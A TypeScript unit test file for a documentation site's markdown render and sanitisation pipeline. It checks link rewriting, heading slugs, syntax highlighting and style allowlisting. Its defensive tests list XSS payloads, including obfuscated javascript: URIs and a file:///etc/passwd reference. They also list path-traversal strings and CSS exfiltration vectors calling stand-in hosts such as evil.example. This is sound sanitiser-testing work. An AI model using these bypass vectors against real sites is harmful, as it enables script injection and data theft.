// Unit coverage for the docs SSG render pipeline.
//
// `scripts/lib/docs-render.mjs` is the single source of truth for
// the docs markdown → HTML transform. The end-to-end Playwright
// suite in `tests-e2e/docs-links.spec.ts` exercises the deployed
// output; this suite probes the pipeline directly for adversarial
// URIs and rewriter rules per
// `.claude/rules/sanitizer-security.md` §"Testing completeness".

import { describe, expect, it } from 'vitest';

import {
  DOC_GROUPS,
  cleanUrlFor,
  extractOutline,
  highlightCodeBlock,
  isExternalHttpHref,
  isSafeHref,
  renderMarkdown,
  rewriteHref,
  slugify,
  slugifyWithCounter,
} from '../scripts/lib/docs-render.mjs';

describe('isSafeHref / isExternalHttpHref', () => {
  it('blocks the canonical dangerous URI schemes', () => {
    for (const scheme of [
      'javascript:alert(1)',
      'JAVASCRIPT:alert(1)',
      'vbscript:foo',
      'data:text/html,foo',
      'file:///etc/passwd',
      'blob:https://example.com/abc',
      'mhtml:!foo',
    ]) {
      expect(isSafeHref(scheme), scheme).toBe(false);
    }
  });

  it('allows ordinary http(s), mailto, relative, and fragment hrefs', () => {
    for (const href of [
      'https://example.com',
      'http://example.com',
      'mailto:a@b.c',
      '/chordsketch/docs/embed-react/',
      './sibling/',
      '#some-heading',
      '',
    ]) {
      expect(isSafeHref(href), href).toBe(true);
    }
  });

  it('tolerates invisible / whitespace chars inside a dangerous scheme', () => {
    expect(isSafeHref('java​script:alert(1)')).toBe(false);
    expect(isSafeHref('  javascript:alert(1)')).toBe(false);
    expect(isSafeHref('JA­vascript:alert(1)')).toBe(false);
  });

  it('isExternalHttpHref reports the absolute http(s) prefix', () => {
    expect(isExternalHttpHref('https://example.com/')).toBe(true);
    expect(isExternalHttpHref('http://example.com/')).toBe(true);
    expect(isExternalHttpHref('./relative')).toBe(false);
    expect(isExternalHttpHref('mailto:a@b.c')).toBe(false);
  });
});

describe('renderMarkdown — sanitisation', () => {
  it('strips javascript: hrefs and src values', () => {
    const html = renderMarkdown(
      '[click](javascript:alert(1))\n\n![pwn](javascript:alert(2))',
    );
    expect(html).not.toContain('javascript:');
  });

  it('strips raw <script> blocks injected in the source', () => {
    const html = renderMarkdown('Hello <script>alert(1)</script>');
    expect(html).not.toContain('<script>');
  });

  it('upgrades external links to target=_blank rel=noreferrer noopener', () => {
    const html = renderMarkdown('[example](https://example.com)');
    expect(html).toContain('target="_blank"');
    expect(html).toMatch(/rel="noreferrer noopener"/);
  });

  it('strips author-supplied target attributes on internal links', () => {
    const html = renderMarkdown('<a href="./internal" target="_self">click</a>');
    expect(html).not.toContain('target=');
  });

  it('disambiguates duplicate headings with -1 / -2 suffixes', () => {
    const html = renderMarkdown('## Intro\n## Intro\n## Intro');
    expect(html).toContain('<h2 id="intro">');
    expect(html).toContain('<h2 id="intro-1">');
    expect(html).toContain('<h2 id="intro-2">');
  });

  it('does not leak heading counters between renders', () => {
    renderMarkdown('## Intro');
    const second = renderMarkdown('## Intro');
    expect(second).toContain('<h2 id="intro">');
    expect(second).not.toContain('intro-1');
  });
});

describe('slug parity with extractOutline', () => {
  it('produces matching slugs for duplicated headings', () => {
    const source = '## Intro\n\nfoo\n\n## Intro\n\nbar\n\n## Intro\n\nbaz';
    const html = renderMarkdown(source);
    const outline = extractOutline(source);
    expect(outline.map((e) => e.id)).toEqual(['intro', 'intro-1', 'intro-2']);
    for (const entry of outline) {
      expect(html).toContain(`id="${entry.id}"`);
    }
  });

  it('ignores headings inside fenced code blocks', () => {
    const source = [
      '## Real heading',
      '',
      '```',
      '## Code block heading',
      '```',
      '',
      '## Another real heading',
    ].join('\n');
    const outline = extractOutline(source);
    expect(outline.map((e) => e.text)).toEqual([
      'Real heading',
      'Another real heading',
    ]);
  });
});

describe('slugify primitives', () => {
  it('lowercases, strips non-alphanumeric, and collapses whitespace', () => {
    expect(slugify('  Hello, World!  ')).toBe('hello-world');
    expect(slugify('A & B / C')).toBe('a-b-c');
  });

  it('slugifyWithCounter advances on repeat slugs', () => {
    const counters = new Map<string, number>();
    expect(slugifyWithCounter('intro', counters)).toBe('intro');
    expect(slugifyWithCounter('intro', counters)).toBe('intro-1');
    expect(slugifyWithCounter('intro', counters)).toBe('intro-2');
  });
});

describe('rewriteHref', () => {
  it('passes through absolute http(s) URLs', () => {
    expect(rewriteHref('https://example.com/x', 'docs/sdk')).toBe(
      'https://example.com/x',
    );
  });

  it('passes through mailto + protocol-relative URLs', () => {
    expect(rewriteHref('mailto:a@b.c', 'docs/sdk')).toBe('mailto:a@b.c');
    expect(rewriteHref('//cdn.example.com/x', 'docs/sdk')).toBe(
      '//cdn.example.com/x',
    );
  });

  it('passes through fragment-only in-page anchors untouched', () => {
    expect(rewriteHref('#some-heading', 'docs/sdk/tasks')).toBe('#some-heading');
  });

  it('passes through root-relative absolute paths unchanged', () => {
    // Without this guard a root-relative href would fall into
    // `resolveRelative` and be rewritten to a github.com blob URL.
    expect(rewriteHref('/chordsketch/docs/embed-react/', 'docs/sdk')).toBe(
      '/chordsketch/docs/embed-react/',
    );
    expect(rewriteHref('/some/absolute/path', 'docs/sdk/tasks')).toBe(
      '/some/absolute/path',
    );
  });

  it('rewrites `#/<slug>` hash routes to clean URLs when the slug is registered', () => {
    expect(rewriteHref('#/embed-react', 'docs/sdk/reference')).toBe(
      '/chordsketch/docs/embed-react/',
    );
    expect(
      rewriteHref('#/reference/chord-sheet', 'docs/sdk/reference'),
    ).toBe('/chordsketch/docs/reference/chord-sheet/');
  });

  it('leaves an unknown `#/<slug>` route as an in-page anchor', () => {
    // Unrecognised slugs degrade to the literal hash so the browser
    // attempts a native anchor scroll for unknown targets.
    expect(rewriteHref('#/no-such-page', 'docs/sdk')).toBe('#/no-such-page');
  });

  it('rewrites docs/sdk relative paths to clean URLs', () => {
    expect(rewriteHref('tasks/render.md', 'docs/sdk')).toBe(
      '/chordsketch/docs/render/',
    );
    expect(rewriteHref('render.md', 'docs/sdk/tasks')).toBe(
      '/chordsketch/docs/render/',
    );
    expect(rewriteHref('reference/chord-sheet.md', 'docs/sdk')).toBe(
      '/chordsketch/docs/reference/chord-sheet/',
    );
  });

  it('rewrites docs/sdk/README.md to the docs index URL', () => {
    expect(rewriteHref('../README.md', 'docs/sdk/tasks')).toBe(
      '/chordsketch/docs/',
    );
  });

  it('routes non-docs repo paths to github.com blob URLs', () => {
    expect(rewriteHref('../../packages/npm/README.md', 'docs/sdk')).toBe(
      'https://github.com/koedame/chordsketch/blob/main/packages/npm/README.md',
    );
    expect(
      rewriteHref('../adr/0021-docs-site-co-located-with-playground.md', 'docs/sdk'),
    ).toBe(
      'https://github.com/koedame/chordsketch/blob/main/docs/adr/0021-docs-site-co-located-with-playground.md',
    );
  });

  it('preserves a #anchor suffix on github.com rewrites', () => {
    expect(rewriteHref('../../README.md#installation', 'docs/sdk')).toBe(
      'https://github.com/koedame/chordsketch/blob/main/README.md#installation',
    );
  });
});

describe('cleanUrlFor', () => {
  it('returns the docs-base URL for the empty slug', () => {
    expect(cleanUrlFor('')).toBe('/chordsketch/docs/');
  });
  it('appends a slash to non-empty slugs', () => {
    expect(cleanUrlFor('embed-react')).toBe('/chordsketch/docs/embed-react/');
    expect(cleanUrlFor('reference/chord-sheet')).toBe(
      '/chordsketch/docs/reference/chord-sheet/',
    );
  });
});

describe('DOC_GROUPS registry', () => {
  it('declares 18 pages across 3 groups', () => {
    const total = DOC_GROUPS.reduce(
      (n: number, g: { pages: readonly unknown[] }) => n + g.pages.length,
      0,
    );
    expect(total).toBe(18);
    expect(DOC_GROUPS.map((g) => g.label)).toEqual([
      'Getting started',
      'Recipes',
      'API reference',
    ]);
  });

  it('every page declares slug, sourcePath, title, and blurb in the expected shape', () => {
    const SLUG_RE = /^(?:|[a-z0-9-]+(?:\/[a-z0-9-]+)*)$/;
    const SOURCE_PATH_RE = /^docs\/sdk\/[A-Za-z0-9/_-]+\.md$/;
    for (const group of DOC_GROUPS) {
      for (const page of group.pages) {
        expect(page.slug, `slug ${JSON.stringify(page.slug)}`).toMatch(SLUG_RE);
        expect(page.sourcePath, page.sourcePath).toMatch(SOURCE_PATH_RE);
        expect(page.title.length).toBeGreaterThan(0);
        expect(page.blurb.length).toBeGreaterThan(0);
      }
    }
  });

  it('every page sourcePath resolves to a file that exists on disk', async () => {
    const { readFile } = await import('node:fs/promises');
    const { resolve } = await import('node:path');
    for (const group of DOC_GROUPS) {
      for (const page of group.pages) {
        const path = resolve(__dirname, '../../..', page.sourcePath);
        await expect(readFile(path, 'utf8')).resolves.toBeTypeOf('string');
      }
    }
  });
});

describe('findPage / allPages', () => {
  it('findPage returns undefined for an unknown slug', async () => {
    const { findPage } = await import('../scripts/lib/docs-render.mjs');
    expect(findPage('no-such-page')).toBeUndefined();
  });

  it('findPage returns the matching page for a known slug', async () => {
    const { findPage } = await import('../scripts/lib/docs-render.mjs');
    const page = findPage('embed-react');
    expect(page?.slug).toBe('embed-react');
    expect(page?.title).toBe('Embed in a React app');
  });

  it('allPages returns every entry in DOC_GROUPS in declaration order', async () => {
    const { allPages } = await import('../scripts/lib/docs-render.mjs');
    const slugs = allPages().map((p) => p.slug);
    expect(slugs).toEqual([
      '',
      'embed-react',
      'render',
      'transpose-task',
      'reference',
      'reference/chord-sheet',
      'reference/playground',
      'reference/chord-pro-preview',
      'reference/editors',
      'reference/layout',
      'reference/transpose',
      'reference/chord-diagram',
      'reference/pdf-export',
      'reference/chord-source-edit',
      'reference/ireal-components',
      'reference/ireal-hooks',
      'reference/ireal-helpers',
      'reference/version',
    ]);
  });
});

describe('extractOutline depth filter', () => {
  it('includes h2 + h3 only, excluding h1 / h4 / h5 / h6', async () => {
    const { extractOutline } = await import(
      '../scripts/lib/docs-render.mjs'
    );
    const source =
      '# Title\n\n## Section\n\n### Detail\n\n#### Skip me\n\n##### Skip me\n\n###### Skip me';
    const outline = extractOutline(source);
    expect(outline.map((e) => `${e.level}:${e.text}`)).toEqual([
      '2:Section',
      '3:Detail',
    ]);
  });
});

describe('slugifyWithCounter fallback', () => {
  it('falls back to "heading" for non-ASCII-only text', () => {
    const counters = new Map<string, number>();
    expect(slugifyWithCounter('日本語', counters)).toBe('heading');
    expect(slugifyWithCounter('中文', counters)).toBe('heading-1');
  });
});

describe('renderMarkdown — query-string rewrite', () => {
  it('strips ?query from a relative .md href before slug lookup', async () => {
    const { renderMarkdown } = await import('../scripts/lib/docs-render.mjs');
    const html = renderMarkdown(
      '[link](render.md?v=1)',
      'docs/sdk/tasks/transpose.md',
    );
    // Resolved against docs/sdk/tasks → docs/sdk/tasks/render.md →
    // the `render` slug → /chordsketch/docs/render/. The query is
    // dropped because static URLs have no query semantics here.
    expect(html).toContain('href="/chordsketch/docs/render/"');
    expect(html).not.toContain('?v=1');
  });
});

describe('renderMarkdown — relative-link sourcePath gating', () => {
  it('passes through relative .md hrefs verbatim when sourcePath is missing', async () => {
    const { renderMarkdown } = await import('../scripts/lib/docs-render.mjs');
    // No `sourcePath` argument: the link renderer treats the href as
    // an opaque relative path with no resolution context, so it falls
    // through to the github.com fallback. Locks the behaviour the
    // SSG depends on (it always passes sourcePath) so a future refactor
    // doesn't silently relax the contract.
    const html = renderMarkdown('[doc](./other.md)');
    expect(html).toContain(
      'https://github.com/koedame/chordsketch/blob/main/other.md',
    );
  });
});

describe('resolveRelative escape detection', () => {
  it('throws when a `..` escape would climb above the repo root', async () => {
    const { rewriteHref } = await import('../scripts/lib/docs-render.mjs');
    expect(() => rewriteHref('../../../../etc/passwd', 'docs/sdk')).toThrow(
      /climbs above the repo root/i,
    );
  });
});

describe('isSafeHref — adversarial parity with the Rust suite', () => {
  // Mirrors the corpus in `crates/render-html/src/lib.rs`'s
  // sanitiser tests. Each entry MUST be rejected. Sister-site
  // parity per `.claude/rules/sanitizer-security.md` §"Testing
  // completeness" and `.claude/rules/fix-propagation.md`.
  const blocked: { label: string; href: string }[] = [
    // Uppercase / mixed-case scheme prefixes.
    { label: 'uppercase JAVASCRIPT:', href: 'JAVASCRIPT:alert(1)' },
    { label: 'mixed-case JavaScript:', href: 'JavaScript:alert(1)' },
    { label: 'uppercase VBSCRIPT:', href: 'VBSCRIPT:foo' },
    { label: 'uppercase DATA:', href: 'DATA:text/html,foo' },
    { label: 'uppercase FILE:', href: 'FILE:///etc/passwd' },
    { label: 'uppercase BLOB:', href: 'BLOB:https://example.com/abc' },
    { label: 'uppercase MHTML:', href: 'MHTML:!foo' },
    // Leading-whitespace variants — `trim_start` strips ASCII +
    // Unicode whitespace so `javascript:` ends up at index 0.
    { label: 'leading ASCII spaces', href: '  javascript:alert(1)' },
    { label: 'leading tab', href: '\tjavascript:alert(1)' },
    { label: 'leading newline', href: '\njavascript:alert(1)' },
    { label: 'leading NBSP (U+00A0)', href: '\u00a0javascript:alert(1)' },
    { label: 'leading ideographic space (U+3000)', href: '\u3000javascript:alert(1)' },
    { label: 'leading NEL (U+0085)', href: '\u0085javascript:alert(1)' },
    // ASCII control / whitespace / invisible-format characters in
    // the middle of the scheme — filtered by the body's predicate
    // before the prefix check.
    { label: 'NUL split', href: 'java\u0000script:alert(1)' },
    { label: 'tab split', href: 'java\tscript:alert(1)' },
    { label: 'newline split', href: 'java\nscript:alert(1)' },
    { label: 'CR split', href: 'java\rscript:alert(1)' },
    { label: 'space split', href: 'java\u0020script:alert(1)' },
    { label: 'ZWSP split', href: 'java\u200bscript:alert(1)' },
    { label: 'soft-hyphen split', href: 'java\u00adscript:alert(1)' },
    { label: 'RTL-override split', href: 'java\u202escript:alert(1)' },
    { label: 'BOM split', href: 'java\ufeffscript:alert(1)' },
    // The 30-char filter cap MUST apply to filtered characters, not
    // raw input — 50 invisible-format chars must not push
    // `javascript:` past the cap.
    {
      label: '50x ZWSP padding then javascript:',
      href: `${'\u200b'.repeat(50)}javascript:alert(1)`,
    },
  ];
  for (const { label, href } of blocked) {
    it(`rejects ${label}`, () => {
      expect(isSafeHref(href)).toBe(false);
    });
  }
});

// Hex colour widths emitted by Shiki are 3 / 4 / 6 / 8 — anything
// else is invalid CSS. Pin the regex tightly so a future Shiki
// release emitting a malformed colour fails the assertion instead
// of slipping through a permissive `{3,8}` window.
const HEX_COLOUR = /#(?:[0-9A-Fa-f]{3,4}|[0-9A-Fa-f]{6}|[0-9A-Fa-f]{8})/;
const COLOUR_SPAN_RE = new RegExp(`<span style="color:${HEX_COLOUR.source}">`);

describe('highlightCodeBlock', () => {
  it('emits a shiki-wrapped pre + per-token coloured spans for a known language', () => {
    const html = highlightCodeBlock(
      "import { ChordSheet } from '@chordsketch/react';",
      'tsx',
    );
    expect(html.startsWith('<pre class="shiki')).toBe(true);
    expect(html).toMatch(COLOUR_SPAN_RE);
    expect(html).toContain('ChordSheet');
    // Wrapper-level presentation attrs (Shiki's `style`,
    // `tabindex`, and any future ones the `stripPreWrapper`
    // allowlist drops) must be absent so the existing `.docs-prose
    // pre` CSS rule keeps controlling background / padding / radius.
    expect(html).not.toMatch(/<pre[^>]*\sstyle=/);
    expect(html).not.toMatch(/<pre[^>]*\stabindex=/);
  });

  it('preserves tokenisation boundaries: keyword and string land in distinct coloured spans', () => {
    // A regression that collapses all tokens into a single coloured
    // span would still satisfy the "<span color> import </span>"
    // assertion above. Asserting that distinct token classes land
    // in *different* colour values catches that mutation.
    const html = highlightCodeBlock(
      "import { ChordSheet } from '@chordsketch/react';",
      'tsx',
    );
    const importMatch = html.match(
      new RegExp(`<span style="color:(${HEX_COLOUR.source})">import</span>`),
    );
    // Shiki preserves the leading whitespace inside the string span
    // (` '@chordsketch/react'`), so the regex tolerates leading spaces.
    const stringMatch = html.match(
      new RegExp(
        `<span style="color:(${HEX_COLOUR.source})">\\s*'@chordsketch/react'</span>`,
      ),
    );
    expect(importMatch?.[1]).toBeDefined();
    expect(stringMatch?.[1]).toBeDefined();
    expect(importMatch![1].toLowerCase()).not.toBe(
      stringMatch![1].toLowerCase(),
    );
  });

  it('wraps each source line in a <span class="line"> structural marker', () => {
    // Pinning the per-line wrapper structurally lets future
    // features (copy button, line numbers, gutter scrolling) hang
    // off a stable class name. Regression: a Shiki option flip
    // that drops the wrapper would silently break them.
    const html = highlightCodeBlock('const a = 1;\nconst b = 2;', 'tsx');
    const matches = html.match(/<span class="line">/g);
    expect(matches?.length).toBe(2);
  });

  it('highlights ChordPro using the in-repo TextMate grammar', () => {
    // `syntaxes/chordpro.tmLanguage.json` scopes `{title` as a
    // `keyword.control.directive.chordpro` and the value as a
    // string. Both segments MUST land in distinct coloured spans —
    // otherwise the grammar load silently fell back to plain text.
    const html = highlightCodeBlock('{title: Demo}', 'chordpro');
    expect(html.startsWith('<pre class="shiki')).toBe(true);
    expect(html).toMatch(
      new RegExp(`<span style="color:${HEX_COLOUR.source}">title</span>`),
    );
    expect(html).toMatch(
      new RegExp(`<span style="color:${HEX_COLOUR.source}">Demo</span>`),
    );
  });

  it('falls back to plain escaped <pre><code> for an unknown language', () => {
    expect(highlightCodeBlock('a < b && c', 'klingon')).toBe(
      '<pre><code>a &lt; b &amp;&amp; c</code></pre>',
    );
  });

  it('falls back to plain escaped <pre><code> when no language is set', () => {
    expect(highlightCodeBlock('plain', '')).toBe('<pre><code>plain</code></pre>');
  });

  it('escapes every HTML special char in the unknown-lang fallback', () => {
    // The five-char minimum is the OWASP HTML-encoding baseline.
    // A regression on any one of these would let an authored
    // markdown source smuggle bytes into the deployed HTML.
    expect(highlightCodeBlock(`&<>"'`, 'klingon')).toBe(
      `<pre><code>&amp;&lt;&gt;&quot;&#39;</code></pre>`,
    );
  });

  it('strips RTL-override (U+202E) from the fallback path while preserving surrounding ASCII', () => {
    // CVE-2021-42574 / Trojan Source: U+202E reverses the visual
    // order of following characters and has been used to make
    // authored source bytes disagree with their rendered
    // presentation. The fallback path must drop the override
    // character; legitimate ASCII bytes around it must survive.
    const input = `before\u{202E}after`;
    const out = highlightCodeBlock(input, 'klingon');
    expect(out).toContain('beforeafter');
    expect(out).not.toContain('\u{202E}');
  });

  it('strips null bytes from the fallback path', () => {
    // Null bytes inside HTML can confuse downstream tools and
    // appear in historical sanitiser bypass chains; drop them.
    const out = highlightCodeBlock(`a\u{0000}b`, 'klingon');
    expect(out).toBe('<pre><code>ab</code></pre>');
  });

  it('preserves ordinary ASCII spaces in the fallback path', () => {
    // Pins that the BIDI / null filter does NOT collateral-damage
    // legitimate whitespace — a regression that broadened the
    // filter to drop U+0020 would mangle every multi-word code
    // sample on the deployed pages.
    expect(highlightCodeBlock('hello world', 'klingon')).toBe(
      '<pre><code>hello world</code></pre>',
    );
  });

  it('strips variation selectors and language-tag characters', () => {
    // Variation selectors (U+FE00– U+FE0F) and language-tag chars
    // (U+E0000– U+E007F) render invisibly and have been used in
    // steganography / prompt-injection vectors. Neutralise them
    // on every path that does not need them — no legitimate
    // ChordPro / docs-source content uses these codepoints.
    const input = `a\u{FE0F}b\u{E0041}c`;
    const out = highlightCodeBlock(input, 'klingon');
    expect(out).toBe('<pre><code>abc</code></pre>');
  });

  it('resolves the `ts` alias and produces shiki-wrapped output', () => {
    const html = highlightCodeBlock('const x: number = 1;', 'ts');
    expect(html.startsWith('<pre class="shiki')).toBe(true);
    expect(html).toMatch(COLOUR_SPAN_RE);
  });

  it('resolves the `sh` alias to a loaded grammar', () => {
    const html = highlightCodeBlock('echo hello', 'sh');
    expect(html.startsWith('<pre class="shiki')).toBe(true);
    expect(html).toMatch(COLOUR_SPAN_RE);
  });

  it('resolves the `shellscript` alias to a loaded grammar', () => {
    const html = highlightCodeBlock('echo hello', 'shellscript');
    expect(html.startsWith('<pre class="shiki')).toBe(true);
    expect(html).toMatch(COLOUR_SPAN_RE);
  });

  it('throws when the input exceeds the documented size cap', () => {
    // Inputs come from in-repo markdown fences; an input over the
    // cap is a contract violation (machine-generated doc, embedded
    // binary, …). Surfacing it as a build error is preferable to a
    // pathological highlight run or silent truncation.
    const big = 'a'.repeat(257 * 1024);
    expect(() => highlightCodeBlock(big, 'tsx')).toThrow(
      /exceeds 262144 bytes/,
    );
  });

  it('accepts input at exactly the size cap (lower boundary)', () => {
    // Pins the boundary so a mutation flipping `>` to `>=` is
    // caught. Semantics: 262144-byte input passes; 262145-byte
    // input throws.
    const atCap = 'a'.repeat(262144);
    expect(() => highlightCodeBlock(atCap, 'klingon')).not.toThrow();
  });

  it('throws at exactly one byte over the cap (upper boundary)', () => {
    const overCap = 'a'.repeat(262145);
    expect(() => highlightCodeBlock(overCap, 'klingon')).toThrow(
      /exceeds 262144 bytes/,
    );
  });
});

describe('renderMarkdown code-fence integration', () => {
  it('runs Shiki on a fenced TSX block and survives DOMPurify with per-span colours intact', () => {
    // DOMPurify's HTML profile strips `style` by default. The
    // colour-span output is the integration evidence that the
    // PURIFY_CONFIG allowance + the SHIKI_STYLE_TAGS guard hook are
    // both wired in; without either, the spans would survive but
    // their `style` would not.
    const html = renderMarkdown(
      "```tsx\nimport { x } from 'y';\n```\n",
      'docs/sdk/tasks/embed-react.md',
    );
    expect(html).toMatch(/<pre class="shiki[^"]*"><code>/);
    expect(html).toMatch(COLOUR_SPAN_RE);
  });

  // Adversarial allowlist tests — per
  // `.claude/rules/sanitizer-security.md` §"Testing completeness".
  // The `style` ADD_ATTR widening is the only attack surface this
  // PR opens; each blocked tag class needs an explicit test, and
  // each blocked CSS value pattern needs an explicit test.
  it('strips style on a <div> outside SHIKI_STYLE_TAGS', () => {
    const html = renderMarkdown(
      '<div style="background:red">payload</div>\n',
      'docs/sdk/README.md',
    );
    expect(html).not.toContain('style="background:red"');
  });

  it('strips style on an <a> outside SHIKI_STYLE_TAGS', () => {
    const html = renderMarkdown(
      '<a href="https://example.com" style="color:red">x</a>\n',
      'docs/sdk/README.md',
    );
    expect(html).not.toMatch(/<a[^>]*\sstyle=/);
  });

  it('strips style on a <p> outside SHIKI_STYLE_TAGS', () => {
    const html = renderMarkdown(
      '<p style="font-size:99px">x</p>\n',
      'docs/sdk/README.md',
    );
    expect(html).not.toMatch(/<p[^>]*\sstyle=/);
  });

  it('strips style on an SVG child even when USE_PROFILES.html lets it through', () => {
    // USE_PROFILES.html does NOT enable SVG, so the whole subtree
    // is stripped. This test pins that posture — if a future
    // contributor adds `svg: true` to USE_PROFILES, this assertion
    // catches the regression and forces them through the
    // sanitiser-security audit before widening the profile.
    const html = renderMarkdown(
      '<svg><g style="fill:red"></g></svg>\n',
      'docs/sdk/README.md',
    );
    expect(html).not.toContain('<svg');
    expect(html).not.toContain('fill:red');
  });

  it('strips any style on PRE/CODE/SPAN whose value does not match the Shiki allowlist', () => {
    // Defence is a fail-closed allowlist of CSS property:value
    // patterns Shiki actually emits. Anything else loses the
    // entire attribute. Test the resource-loading CSS surface
    // that motivated the allowlist:
    //
    // - `url(...)` — covers the canonical exfil channel; DOMPurify
    //   treats `style` as URI-safe so the URI regex does NOT
    //   apply to CSS values.
    // - `image(...)` / `image-set(...)` — CSS image functions
    //   that can initiate network requests WITHOUT containing
    //   the substring `url(`. A `url(`-only regex would miss
    //   these; the allowlist catches them by construction.
    // - CSS hex escape `\28` for `(` — browsers normalise it
    //   back to `url(` at parse time; the allowlist's strict
    //   value pattern rejects backslash entirely.
    // - `@import url(...)` smuggled into inline style — browsers
    //   ignore `@import` inside `style` attributes, but the
    //   allowlist rejects it regardless.
    // - `var(--x)` referencing CSS custom properties — payload
    //   surface for selector-based exfil; allowlist rejects.
    // - Whitespace + case + punctuation variations on `url(`.
    const vectors = [
      '<span style="background-image:url(/exfil)">x</span>',
      '<span style="background:url(javascript:alert(1))">x</span>',
      '<span style="-moz-binding:url(http://evil.example/x)">x</span>',
      '<span style="behavior:url(#default)">x</span>',
      '<span style="background : URL  ( /exfil )">x</span>',
      '<span style="background-image:image(/exfil)">x</span>',
      '<span style="background-image:image-set(\\"/exfil\\" 1x)">x</span>',
      '<span style="background-image:cross-fade(url(/exfil) 50%)">x</span>',
      '<span style="background-image:url\\28/exfil\\29">x</span>',
      '<span style="background-image:url\\000028/exfil\\000029">x</span>',
      '<span style="@import url(http://evil)">x</span>',
      '<span style="--x:url(/exfil)">x</span>',
      // Comment-bypass attempt (CSS allows `/* */` between tokens).
      '<span style="background:url/* */(/exfil)">x</span>',
    ];
    // Match a real element opening tag with a style attribute
    // whose value contains a dangerous token. Escaped text (e.g.
    // `&lt;span style="..."&gt;`) is NOT a real element and does
    // not pose a CSS exfil risk, so the regex anchors on `<word`
    // (literal `<`) — escaped `&lt;` would not match.
    const DANGEROUS_STYLE_RE =
      /<\w+[^>]*\sstyle="[^"]*(?:url|image|@import|\\)[^"]*"/i;
    for (const v of vectors) {
      const html = renderMarkdown(`${v}\n`, 'docs/sdk/README.md');
      // Either the span survives without ANY style attribute, or
      // it does not survive at all — both are acceptable; the
      // critical assertion is that no real element carries a
      // resource-loading or escape-bearing style value.
      expect(html, v).not.toMatch(DANGEROUS_STYLE_RE);
    }
  });

  it('strips style values that do not match the Shiki property:value allowlist', () => {
    // Catches "unrecognised property" mutations: a future
    // contributor who widens the allowlist (e.g. to permit
    // `width:` for layout shenanigans) gets a failing test on
    // every property NOT yet allowed. The four below are
    // properties browsers honour but Shiki never emits.
    const vectors = [
      '<span style="width:9999px">x</span>',
      '<span style="position:absolute;top:0;left:0">x</span>',
      '<span style="display:none">x</span>',
      '<span style="opacity:0">x</span>',
    ];
    for (const v of vectors) {
      const html = renderMarkdown(`${v}\n`, 'docs/sdk/README.md');
      expect(html, v).not.toMatch(/<span[^>]*style=/);
    }
  });

  it('preserves the legitimate Shiki allowlist values across themes', () => {
    // Pins every property:value Shiki may legitimately emit so a
    // future allowlist tightening that breaks one of them fails
    // here, not silently in deployed output.
    const survivors = [
      'color:#abc',
      'color:#ABCDEF',
      'color:#abcdef12',
      'background-color:#000000',
      'font-style:italic',
      'font-style:oblique',
      'font-weight:bold',
      'font-weight:700',
      'text-decoration:underline',
    ];
    for (const decl of survivors) {
      const html = renderMarkdown(
        `<span style="${decl}">x</span>\n`,
        'docs/sdk/README.md',
      );
      expect(html, decl).toMatch(
        new RegExp(`<span[^>]*style="${decl.replace('#', '#')}"`, 'i'),
      );
    }
  });

  it('keeps the legitimate Shiki span style (color:#…) intact', () => {
    // The url() guard must NOT collateral-damage Shiki's own
    // emitted `color:#XXXXXX` spans. This pins that the guard's
    // false-positive rate is zero on the actual highlighter
    // output.
    const html = renderMarkdown(
      "```tsx\nconst x = 1;\n```\n",
      'docs/sdk/tasks/embed-react.md',
    );
    expect(html).toMatch(COLOUR_SPAN_RE);
  });
});
